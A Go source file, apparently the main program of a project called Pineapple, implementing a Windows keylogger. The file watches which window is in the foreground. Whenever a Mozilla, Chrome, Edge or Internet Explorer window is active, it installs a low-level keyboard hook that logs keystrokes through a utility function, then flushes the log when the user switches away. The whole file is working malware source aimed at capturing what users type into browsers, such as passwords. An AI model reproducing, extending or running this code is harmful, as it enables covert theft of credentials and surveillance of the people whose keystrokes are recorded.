package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/MShoaei/Pineapple/utils"
	"github.com/MShoaei/Pineapple/windows"
)

var wndHook windows.HWINEVENTHOOK
var kbdHook windows.HHOOK

func main() {
	wndHook = windows.SetWinEventHook(windows.EVENT_SYSTEM_FOREGROUND, windows.EVENT_SYSTEM_FOREGROUND, 0, windowLogger, 0, 0, windows.WINEVENT_SKIPOWNPROCESS)
	defer windows.UnhookWinEvent(wndHook)
	defer windows.UnhookWindowsHookEx(kbdHook)
	msg := windows.MSG{}
	for bRet := windows.GetMessageW(&msg, 0, 0, 0); bRet != 0; bRet = windows.GetMessageW(&msg, 0, 0, 0) {
		if bRet == -1 {
			fmt.Println("encountered an error")
			os.Exit(-1)
		}
	}
	os.Exit(int(msg.WParam))
}

func windowLogger(hook windows.HWINEVENTHOOK, event windows.DWORD, hwnd windows.HWND, idObject windows.LONG, idChild windows.LONG, dwEventThread windows.DWORD, dwmsEventTime windows.DWORD) uintptr {
	if event == windows.EVENT_SYSTEM_FOREGROUND {
		title := windows.GetWindowTextW(hwnd)
		if strings.Contains(title, "Mozilla") || strings.Contains(title, "Chrome") || strings.Contains(title, "Edge") || strings.Contains(title, "Internet Explorer") {
			fmt.Println(title)
			kbdHook = windows.SetWindowsHookExA(13, utils.Log, 0, 0)
		} else {
			windows.UnhookWindowsHookEx(kbdHook)
			utils.Flush()
		}
	}
	return 0
}
